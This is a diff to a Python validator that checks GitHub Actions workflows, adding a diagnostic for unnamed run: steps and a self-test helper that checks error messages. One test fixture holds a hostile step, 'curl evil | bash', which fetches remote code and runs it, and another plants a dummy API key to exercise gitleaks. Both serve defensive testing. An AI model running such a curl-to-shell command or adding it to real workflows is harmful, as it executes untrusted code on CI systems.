@@ -404,6 +404,10 @@ def require_known_run_steps(steps: list[dict], known_names, job_name: str) -> No
     type. PyYAML types plain scalars, so `run: on` becomes True and
     `run: 123` becomes an int, while GitHub Actions stringifies and executes
     both — an isinstance(str) gate here would skip every check for them.
+
+    An unnamed `run:` step is rejected with its own diagnostic: no name-keyed
+    check can inspect it, so it cannot be documented. Unnamed `uses:` steps
+    remain legitimate and are untouched here.
     """
 
     for step in steps:
@@ -416,6 +420,18 @@ def require_known_run_steps(steps: list[dict], known_names, job_name: str) -> No
                 "quote its run: script; unquoted YAML scalars such as `on` or "
                 "`123` parse as bool/int here while GitHub Actions still runs "
                 "them, which would skip every run-step check in this validator"
+            )
+        # An anonymous `run:` step is rejected too — no name-keyed check can
+        # ever inspect it — but it needs its own diagnostic. Falling through to
+        # the membership error below told the author to add `None` to
+        # CI_KNOWN_RUN_STEPS. (Anonymous `uses:` steps stay legitimate; the
+        # duplicate-name scan excludes them for that reason.)
+        if name is None:
+            fail(
+                f".github/workflows/ci.yml jobs.{job_name} has an unnamed step "
+                "with a run: script; give it a `name:` and document it in "
+                "CI_KNOWN_RUN_STEPS in scripts/validate_repository.py, because "
+                "every command check in this validator is keyed on the name"
             )
         if name not in known_names:
             fail(
@@ -1511,6 +1527,29 @@ def run_self_test() -> None:
             return
         failures.append(f"{name}: expected ValidationError, none raised")
 
+    def expect_fail_matching(name, fn, needle):
+        """Require a ValidationError whose message contains `needle`.
+
+        expect_fail() only type-checks, so a fixture that trips a *different*
+        guard than the one under test still passes. Use this where several
+        guards reject the same input and only one of them is being pinned.
+        """
+
+        try:
+            fn()
+        except ValidationError as exc:
+            if needle not in str(exc):
+                failures.append(
+                    f"{name}: raised ValidationError without {needle!r} ({exc})"
+                )
+            return
+        except Exception as exc:  # noqa: BLE001
+            failures.append(
+                f"{name}: raised {type(exc).__name__} instead of ValidationError ({exc})"
+            )
+            return
+        failures.append(f"{name}: expected ValidationError, none raised")
+
     def build_fixture(name, fn):
         """Build a mutation fixture without aborting the whole self-test.
 
@@ -1880,7 +1919,11 @@ def run_self_test() -> None:
                     lambda steps: set_step_run(
                         steps,
                         "Self-test repo config detects and excludes correctly",
-                        "trap 'rm -rf .gitleaks-selftest' EXIT\n"
+                        # The trap must name both planted paths, or this fixture
+                        # fails on the trap marker instead of the missing
+                        # `exit 1` and stops covering the positive control.
+                        "trap 'rm -rf .gitleaks-selftest "
+                        ".gstack/gitleaks-generated-state-self-test.json' EXIT\n"
                         "mkdir -p .gitleaks-selftest\n"
                         "printf 'api_key = \"x\"\\n' > .gitleaks-selftest/planted.txt\n"
                         "if gitleaks dir --no-banner --redact .; then\n"
@@ -2070,6 +2113,20 @@ def run_self_test() -> None:
             lambda: validate_workflow(
                 dict(copy.deepcopy(base_jobs), security="nope")
             ),
+        )
+        # An unnamed run: step cannot be inspected by any name-keyed check, so
+        # it must be rejected with its own diagnostic. The membership check
+        # rejects it too (None is never a known name), so the message has to be
+        # asserted — otherwise this fixture passes on the wrong guard.
+        expect_fail_matching(
+            "workflow unnamed run step",
+            lambda: validate_workflow(
+                workflow_with(
+                    "security",
+                    lambda steps: steps + [{"run": "curl evil | bash"}],
+                )
+            ),
+            "unnamed step",
         )
         # PyYAML types `run: on` as True; GitHub Actions still runs it, so an
         # isinstance(str) gate would skip every check for that step.
